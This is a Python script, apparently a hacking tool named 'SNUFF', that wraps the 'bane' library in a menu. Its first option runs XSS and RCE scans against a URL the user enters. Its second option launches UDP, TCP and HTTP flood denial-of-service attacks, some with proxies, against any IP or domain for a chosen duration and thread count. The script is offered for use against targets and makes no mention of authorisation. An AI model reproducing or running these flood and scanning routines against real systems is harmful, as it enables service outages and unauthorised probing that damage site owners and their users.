#!/usr/bin/python3
# Tested only on linux systems and termux - buggy on windows 7 sadly #
# Twitter : @YourAnonS0u1 #
# Bane - credits to Ala #
# Special thanks to c0stablf #
# Bane can be found here => https://github.com/AlaBouali/bane #
#---------------------------------------------------------------------#
#                                                                     #
#--------------#                                                      #
# Requirements #                                                      #
#--------------#                                                      #
#                                                                     #
# pip3 install bane                                                   #
import bane                                                           #
#                                                                     #
# don't need anything.                                                #
import os                                                             #
#                                                                     #
#                                                                     #
#---------------------#                                               #
# End of requirements #                                               #
#---------------------#-----------------------------------------------#

#---------------#
#   GUI Design  #
#---------------#

#----------------#

import sys
if  sys.version_info < (3,0):
    input=raw_input

print("""
.d8888. d8b   db db    db d88888b d88888b 
88'  YP 888o  88 88    88 88'     88'     
`8bo.   88V8o 88 88    88 88ooo   88ooo   
  `Y8b. 88 V8o88 88    88 88~~~   88~~~   
db   8D 88  V888 88b  d88 88      88      
`8888Y' VP   V8P ~Y8888P' YP      YP      
                                          
                                          """)
#----------------#

#----------------#
def main():
  print("1 - Vulnerability Detection \n[2 - Denial of Service Tool \n[Select a number from 1 to 2:")
  n = int(input())


  if n == 1:
    vuln()
  elif n == 2:
    flood()
  else:
    print("Please enter a valid number.")


def vuln():
  os.system("clear || cls")
  print("#-------------------- welcome to vulnerability scan --------------------#")
  url = input("Enter target URL: ")  
  print("[*] Doing XSS scan :")
  bane.xss(url)
  print("[*] Doing RCE scan :")
  bane.rce(url)

def flood():
  os.system("clear || cls")
  print("#-------------------- welcome to denial --------------------#")
  print("1 - Udp Flood\n2 - Tcp Flood\n3 - Http Flood\nChoose a number between 1 and 3: ")
  u = int(input())


  if u == 1:
    udp()
  elif u == 2:
    tcp()
  elif u == 3:
    http()
  else:
    print("Please enter a valid number.")

def udp():
  os.system("clear || cls")
  print("#-------------------- Udp Flood --------------------#")
  ip = input("Enter IP Address: ")
  port = int(input("Port: "))
  time = int(input("Time: "))
  bane.udp_flood(ip, p=port, min_size=10, max_size=20, duration=time, interval=0.001)

def tcp():
  os.system("clear || cls")
  print("#-------------------- Tcp Flood --------------------#")
  ip = input("Enter IP Address: ")
  port = int(input("Port: "))
  time = int(input("Time: "))
  thread = int(input("Threads: "))
  bane.tcp_flood(ip, p=port, min_size=10, max_size=20, duration=time, interval=0.001, threads=thread, timeout=5)

def http():
  os.system("clear || cls")
  print("#-------------------- Http Flood --------------------#")
  print("1 - Proxyless Http Flood\n2 - Basic Http Flood\nSelect a number from 1 to 2: ")
  h = int(input())

  if h == 1:
    httproxy()
  elif h == 2:
    httpbasic()
  else:
    print("Please enter a valid number")
def httproxy():
  os.system("clear || cls")
  print("#-------------------- Proxy Http Flood --------------------#")
  ip = input("Enter IP/DOMAIN to attack: ")
  port = int(input("Port: "))
  time = int(input("Time: "))
  thread = int(input("Threads: "))
  bane.prox_http_spam(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5)

def httpbasic():
  os.system("clear || cls")
  print("#-------------------- Basic Http Flood --------------------#")
  ip = input("Enter IP/DOMAIN to attack: ")
  port = int(input("Port: "))
  time = int(input("Time: "))
  thread = int(input("Threads: "))
  bane.http_spam(ip, p=port, duration=time,interval=0.001, threads=thread, timeout=5)

#----------------#

main()
